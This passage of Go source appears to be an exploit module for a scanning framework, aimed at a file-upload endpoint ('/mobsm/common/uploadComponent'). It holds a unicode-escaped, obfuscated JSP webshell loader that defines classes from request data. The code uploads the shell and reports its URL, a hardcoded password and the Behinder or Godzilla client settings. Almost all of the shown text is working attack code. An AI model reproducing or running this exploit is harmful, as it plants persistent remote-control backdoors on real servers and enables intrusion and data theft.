\uuuuuuu0074\uuu0041\u0063\uuuu0063\uuuuuuu0065\u0073\uuuuuuuu0073\uuuuuuuuu0069\uuuuu0062\uuuuuuuu006c\uuuuuu0065\uuuu0028\uu0074\uuuuuu0072\uuuuuuuu0075\u0065\uuuuuuu0029\uuuuuuuu003b\uuuuuuuu004f\uu0062\uuuuuuuu006a\uuuuuuuu0065\uuuuuuuuuu0063\uuu0074\uuuuuuu0020\uuuuuuuuu0064\uuuuu0020\uuu003d\uuuuuuu0020\uu0063\uu002e\uuuuuu006e\uuuuuuuuu0065\uuuuuuuu0077\uuuuuuuuu0049\uuuuuuuuuu006e\u0073\uuuu0074\uuu0061\uuu006e\uuuuuu0063\uu0065\uuuuuuuuuu0028\uu006e\uuuuu0065\uuuuuuuuuu0077\uuuuuu0020\uuuu004f\uuu0062\uu006a\u0065\uuuuuuuuu0063\uuuuuuuuuu0074\uuuuuu005b\uuuuuuuu005d\uuuu007b\uuuuuu0054\u0068\uuuuuuuuu0072\uuu0065\uuuuuuuuu0061\uuuuuuuuu0064\uuuuuuu002e\uuuuuuuuu0063\uuuu0075\uuu0072\uuuu0072\uu0065\uuu006e\uuuuuuuu0074\uuuu0054\uuuuuuuu0068\uuuuuuuu0072\uuuu0065\uuu0061\uuuuuuuuu0064\uuuuuu0028\uuuuuuuuuu0029\uuuuuuuu002e\uuu002f\uuuuuu002a\u005a\u0023\uuffe5\uuuuu0068\u002a\uuuu0075\uuu0040\uuuuuuuu0021\uuuuu0068\uuu0051\u0063\uuu0041\uuuuuu0039\uuuuuuuuuu0072\uuuuuuuuuu0044\uuuuuuuuuu0036\uuuuu0036\uuuuuuuuu0032\uu002a\uuuuuuuuuu002f\uuuuuuuuuu0067\u0065\uuuu0074\uuu0043\u006f\uu006e\u0074\uuuu0065\uuuuuuuuu0078\uuuuuuuuu0074\uuuuuuuuu0043\uu006c\u0061\uuuu0073\uu0073\uuuuuuu004c\uuuuuuuuu006f\u0061\uu0064\uuuuuuu0065\uuuuuuu0072\uuuuuuu0028\uuuuuuuu0029\u002c\uuu0054\uuuuuuuuu0068\uuu0072\uuuuuuuuuu0065\uuuuuuuuu0061\uuu0064\uuuu002e\uuuu0063\uuuuuuuuuu0075\uuuuuu0072\uuuuuuu0072\uuuuuuuuuu0065\uuuuu006e\uuuuuuuu0074\uuuuu0054\u0068\u0072\uuuuuuu0065\uuu0061\uuuuuu0064\u0028\u0029\uu002e\uuuuuuu002f\u002a\uuuuuuuuu005a\uuu0023\uuuuuuuuuuffe5\uuuuu0068\uu002a\uuu0075\uuuuuuuuuu0040\uuuuuuuuu0021\uuuuu0068\uuu0051\uuuuuuuuuu0063\u0041\uuuuu0039\uu0072\uuu0044\uuuuuu0036\uuuuuuuu0036\uu0032\uuuuuuu002a\uuuuuuu002f\uuuuu0067\uuuuuuuuu0065\uuuuu0074\uuuuuuu0043\uuuuuuuuuu006f\uuuuuuuuuu006e\uuuuuuuuuu0074\uuuu0065\uuuuuuuuu0078\uuu0074\uu0043\uu006c\uuuuuuu0061\uuu0073\uuuuuuuuu0073\uu004c\uuu006f\uuuuuuuuu0061\uu0064\u0065\uu0072\uu0028\uu0029\uuuuuuuuu007d\uuuuuuu0029\uuuuuuuuu003b\uuuuu006a\uuuu0061\uuuuuuuuu0076\uuuuuu0061\uuuu002e\uuuu006c\uuuuuuuuuu0061\uuuuu006e\uuuuuuuuuu0067\uuuuu002e\uu0072\uuuu0065\uuuuu0066\uuuuuuu006c\uuuuuuuuu0065\uuuuuu0063\uuuuuuu0074\uuuuu002e\uuuuuuuuuu004d\uuuuuuuu0065\uu0074\uu0068\u006f\uu0064\uuuuuuu0020\uuu0046\uuu0047\uuuuuuuu0033\uuu0063\uu0033\uuu0036\uuuuuuuu0020\uuuuu003d\u0020\uuuuu0050\uuuuuuu0042\uuuuuu002e\uuuuuuuu0067\uuuuuu0065\uuuu0074\uuuuu0053\uuuuu0075\uuuuuu0070\uuu0065\uuuuuuu0072\uuuuuuuuu0063\uuuuuuuuu006c\uuuuuuuu0061\uuu0073\uuuu0073\uuuuu0028\uuuuuuuuuu0029\uuu002e\uuuuuuu0067\uuuuuuuuuu0065\uuu0074\uuuuu0044\uu0065\uuuuuuuuuu0063\uuuuuuuuuu006c\u0061\uuuuuuuuuu0072\u0065\uuuuuuuu0064\uuuuu004d\uuuuuuu0065\uuuuuuu0074\uuu0068\uuuuuuuuu006f\uuuuuu0064\uuuuuuuu0028\uuuuuuuuu0022\uu0064\uuu0065\uuu0066\uuuuuuuuu0069\uuuu006e\u0065\u0043\uuuu006c\uuuuuu0061\uuu0073\uuuu0073\uuuuu0022\uuuuuuuu002c\uuuuu006e\uuuu0065\uuuuuuuuuu0077\uuuuuuuuuu0020\uuuuuuuuu0043\uuuuu006c\uuuuuuu0061\uuuuuuuuu0073\uuuuuuuuuu0073\uuu005b\uuuuuuuuuu005d\uuuuuuuuu007b\uuu0062\uuu0079\uuuuuu0074\uuuuuu0065\uuuuuuu005b\uuuu005d\uuuu002e\uuuu0063\uuuuuuuuuu006c\uu0061\u0073\uuuuuuuu0073\uuuuu002c\uu0069\uuuu006e\u0074\uuuuuuuu002e\uuuuuuuuuu0063\uu006c\u0061\uuuuuuu0073\uuuuuuu0073\uuuuu002c\uuuu0069\uuuu006e\uuuuuuu0074\u002e\uuuuu0063\uuuuuu006c\uuuuu0061\uuuuuuuuu0073\uuuuuu0073\uuuuuu007d\uuuuuuuuuu0029\uuu003b\uuuuuu0046\uuuuuuuuuu0047\uu0033\uuuuuuu0063\uuuuuu0033\u0036\uu002e\uuuuu0073\uuuuuuuuuu0065\uuu0074\uuuuuuuuu0041\uu0063\u0063\uuuu0065\uuu0073\uu0073\uuuuuu0069\uuuuuuuuu0062\uuuuuuu006c\uuuuuuuuu0065\uuu0028\uuuuuuuu0074\uuuuu0072\u0075\u0065\uuuuuuuu0029\uuuuuuuuuu003b\uuu0073\uuuuuuu0065\uuuuu0073\uuuuuuuu0073\uuuuuu0069\uuuuuuuuu006f\uuuuuuuu006e\uuu002e\uu0073\uuuuuu0065\uuuuuuuuu0074\uuuuuuu0041\uuu0074\u0074\uuuuuu0072\uuuuuuuuuu0069\uu0062\uuuuuuuu0075\uuuu0074\uuuuuuu0065\u0028\uuuuuuuu0022\uuuuuuuu0074\uuuu0069\uuuuu0022\u002c\uuuu0020\uuuuuuuuu0046\uuuuuuu0047\uuuuuuuu0033\uuuuuuu0063\uuuuuu0033\uuuuuuuu0036\uuuuu002e\uuuu0069\uuu006e\uuuu0076\uuuuuuuuu006f\uuuuuuuuuu006b\uuuu0065\u0028\uuuuuuu0064\uuuu002c\u0020\uuuuuuuu006e\uuuuuuuu0065\uuuuuuu0077\uuu0020\uu004f\uuuuu0062\uuuuu006a\uuuuuuuuuu0065\u0063\uuuuuu0074\uuuuuuuuuu005b\uuuuuuuu005d\uuu007b\uuuu0043\uuuuuu0078\uuuuuuuuu007a\uuuuuuuuu0031\uuuuuuuu002c\uuuuuuu0020\u0030\uuuuuuuuuu002c\uuuuuuuuuu0020\uuuuuu0043\uuuuuuuuuu0078\uuuu007a\uu0031\uuuuuuuuu002e\uuuuuuuuu006c\uuuuu0065\uuu006e\uuuu0067\uuuuu0074\uuu0068\uuuuu007d\uuuuuuuu0029\uuuuuu0029\uuuuuuu003b\uuuuuu007d\uuuuuuuuuu0020\uuuu0065\uuu006c\uu0073\uuuuuuuuuu0065\u0020\uu007b\uuuuuuuuu0072\uuu0065\uuu0071\uuuuuuuuu0075\uuuuuuuuuu0065\uuuuuu0073\uuuuuuuuu0074\uu002e\u0073\uuuuuuuu0065\uuu0074\u0041\uuuuuu0074\uuuuuuuuu0074\uuuuuuu0072\uuuuuu0069\uuuuuuuuuu0062\u0075\uuuuuuuu0074\uu0065\uuuuuuu0028\uuu0022\u0070\uuu0061\uuuuu0072\uuuuuuuuu0061\uuuu006d\u0065\uuuuuu0074\uu0065\uuuuu0072\uuuuuuuuu0073\uuuuuuu0022\uuu002c\uuuuuuuu0020\uuuuuuuu0043\uuuuuu0078\uuuuuuu007a\uuu0031\uuuuuuuu0029\uuuuuuuu003b\u006a\uuuuuuuuuu0061\uuuuuuu0076\uuuuuuuu0061\uu002e\u0069\uu006f\uu002e\uu0042\uuuu0079\uuuuuuuuu0074\uuuuuuuuuu0065\uuuuuuuuuu0041\uuuuuuu0072\uuuuu0072\uuuuuuuu0061\uuuuuuu0079\u004f\uuuuuuuuu0075\uuuu0074\uu0070\uuuuuu0075\uuuuuuuu0074\uuu0053\uuuuu0074\uuuuuuu0072\uuuuuuu0065\uuu0061\uuuuuuuu006d\uuuuuuu0020\uuuuu0045\uuuuuuuuu004c\uuuuuuu0036\uuuuu0061\uuuuuu004d\uuuuuu0069\uuuuuuuu0033\uuu0039\uu0020\uuu003d\uuuuuuuuuu0020\uuuuuuu006e\uuuuuuu0065\uuuuuuuuu0077\u0020\uuuuuuu006a\uu0061\uuuuuu0076\uuuuuuuuuu0061\uuu002e\uuuuuu0069\u006f\uuuuu002e\uuuuuu0042\u0079\uuuu0074\uuuuuu0065\uuuuuuuuuu0041\uuuuuuuu0072\uuu0072\uuuuuuuu0061\uuuu0079\uuuuuuuuuu004f\u0075\uuu0074\uuuuuuuuuu0070\uuuuu0075\u0074\uuu0053\uuuuuuuuu0074\uuuuuuuuuu0072\uuuuuuuuuu0065\uuuuuu0061\uuuu006d\uuuuuu0028\uuuuu0029\uuuuuuuu003b\uuuuuuuuuu0020\uuuuuuuuuu004f\uuuuuuuu0062\uuuu006a\uuuuuuuu0065\uuuu0063\uuuu0074\uuuuuuu0020\uuuu0066\uu0020\uuuuuu003d\uuuuuuuuu0020\uuuuuu0028\uuuuuuu0028\uuu0043\uuuuuuuuuu006c\uuuuu0061\uuuu0073\uuuuuu0073\uu0029\u0020\uuuuuu0073\uuuuu0065\uuu0073\uuuu0073\u0069\uuuuuu006f\uuuuu006e\uuuuuuuuu002e\u0067\uuuuuuu0065\uuuuuu0074\uuu0041\uu0074\uuuuuuuuuu0074\uuuuuuuuu0072\u0069\uuuuuu0062\uuuuuuuuuu0075\uu0074\uuuuuuuu0065\uuuuuuuuuu0028\uuuuuuu0022\uuuuuuuuu0074\uuuuuuuuu0069\uuuuuu0022\uuuu0029\uuuuu0029\uuuuu002e\u006e\u0065\uuuuu0077\uuu0049\uuuuuuuu006e\uuuuuuuu0073\uu0074\uu0061\uu006e\uuuuuuu0063\uuuuuuu0065\u0028\uuuuuuuu0029\uuuu003b\uuu0020\uuuuuuuuuu0066\u002e\uuu0065\u0071\uuuuuuuu0075\uuuuu0061\uu006c\uuuuuuuuu0073\uu0028\uuu0045\u004c\uuuuuuu0036\uuuu0061\uuuu004d\uuuuu0069\uuuuuuuuu0033\uuuuuuuu0039\uuuu0029\uuuuuuuu003b\uu0066\uuuu002e\uuuuuuuu0065\u0071\u0075\uuuu0061\uuuu006c\uuuu0073\uuuuuuuuuu0028\uuuuuu0070\uuuuu0061\uuuuuuuuuu0067\uuu0065\uuuuuuu0043\uuuuu006f\uuuuu006e\u0074\uuuuuu0065\uuuuuuuu0078\uuuuuuuuu0074\uuu0029\u003b\uuuuu0066\uu002e\uuuuuuuuu0074\uuuuuuuu006f\uuuu0053\uuuuu0074\uuuuuuuuu0072\u0069\u006e\u0067\uu0028\uuuuuuu0029\uuuuuuuuuu003b\u0020\uuuuuuu0072\uuuuu0065\uuuuuu0073\u0070\uuuuuuuuu006f\uu006e\uuuuuu0073\uuuu0065\uu002e\uuu0067\uu0065\u0074\uuuu004f\uuuu0075\u0074\uuuuuuuuuu0070\u0075\uuuuuuuuuu0074\uuuuu0053\uuuuuu0074\uuuuu0072\uuu0065\uuuuuuu0061\uuuuuuu006d\uu0028\uuu0029\uu002e\uuu0077\uuu0072\uuuuuuuu0069\uuuuu0074\uuuuuuuuuu0065\uuuuuu0028\uuuuuuuuuu0041\uuuu0044\uuuu0046\uuuuuuuuuu0031\uuuuuuu0030\u0028\uuuuuu0045\uuuuuuuuu004c\uuuuuuuuuu0036\u0061\uuuuuuuuuu004d\uuuuuuu0069\uu0033\uuuu0039\u002e\uuuuu0074\uuuuuuu006f\uuuuuuuuuu0042\uuuuuuuuu0079\uuuuuuuu0074\uuuuu0065\uuuuuuuuuu0041\uuuuuuuuuu0072\uuuuuu0072\uuuuuuuuuu0061\uuu0079\uu0028\uuuuu0029\uuuuu002c\uuuuuuuuu0020\u0074\uuuuuu0072\uu0075\uuuuu0065\uuuuuuuuuu0029\uuuuuuuuu0029\u003b\uuuu007d\uuuuuuu007d\uuuuu0020\uuuuuuu0063\uuuuuuuuu0061\u0074\uuuuuuuu0063\uu0068\uuuuuuuuuu0020\u0028\uuuuuu0045\uuuuuuuuu0078\uuuuuu0063\uuuuuuu0065\uuu0070\uuuuu0074\uuuuuuuuu0069\uuuuu006f\uuuuuuuuu006e\uuuuuu0020\uu0065\uuuuuuuuu0029\uu0020\u007b\uuuuuu007d %>`
			} else if attackType == "custom" {
				filename = filename
				content = content
			} else {
				expResult.Output = "未知的利用方式"
				return expResult
			}
			isVul := expPostHttpXjhd6387Yu(expResult.HostInfo, "/mobsm/common/uploadComponent", filename, content)
			//利用不成功
			if !isVul {
				expResult.Output = "利用失败，webshell可能被拦截"
				return expResult
			}
			expResult.Success = true
			expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/mobsm/uploadComponent/" + filename + "\n"
			if attackType == "behinder" {
				expResult.Output += "Password: hjdyhr12yu\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if attackType == "godzilla" {
				expResult.Output += "Password&key: hjdyhr12yu  加密器：JAVA_AES_RAW\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			return expResult
		},
	))
}
